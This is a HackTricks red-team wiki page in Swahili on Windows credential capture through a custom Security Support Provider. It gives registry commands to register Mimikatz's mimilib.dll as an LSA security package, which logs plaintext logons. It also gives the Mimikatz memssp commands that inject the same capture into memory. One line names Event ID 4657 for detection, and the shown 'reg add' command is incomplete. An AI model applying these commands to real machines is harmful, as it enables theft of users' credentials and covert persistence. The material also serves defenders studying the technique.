# Custom SSP

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa kipekee wa [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

### SSP ya Kibinafsi

[Jifunze ni nini SSP (Mtoa Msaada wa Usalama) hapa.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
Unaweza kuunda **SSP yako mwenyewe** ili **kukamata** kwa **maandishi wazi** **vitambulisho** vinavyotumiwa kupata kompyuta.

#### Mimilib

Unaweza kutumia faili ya `mimilib.dll` iliyotolewa na Mimikatz. **Hii itaandika kwenye faili vitambulisho vyote kwa maandishi wazi.**\
Weka dll kwenye `C:\Windows\System32\`\
Pata orodha ya Pakiti za Usalama za LSA zilizopo:

{% code title="attacker@target" %}
```bash
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
{% endcode %}

Ongeza `mimilib.dll` kwenye orodha ya Watoaji wa Usaidizi wa Usalama (Security Packages):

```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```

Na baada ya kuanza upya, vitambulisho vyote vinaweza kupatikana kwa maandishi wazi katika `C:\Windows\System32\kiwissp.log`

#### Kumbukumbu

Unaweza pia kuingiza hii moja kwa moja kwenye kumbukumbu kwa kutumia Mimikatz (tambua kuwa inaweza kuwa kidogo isiyo thabiti/isiyofanya kazi):

```powershell
privilege::debug
misc::memssp
```

Hii haitadumu baada ya kuzima na kuwasha tena.

#### Kupunguza Hatari

Tukio la Kitambulisho 4657 - Ukaguzi wa uundaji/mabadiliko ya `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka mwanzo hadi kuwa bingwa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
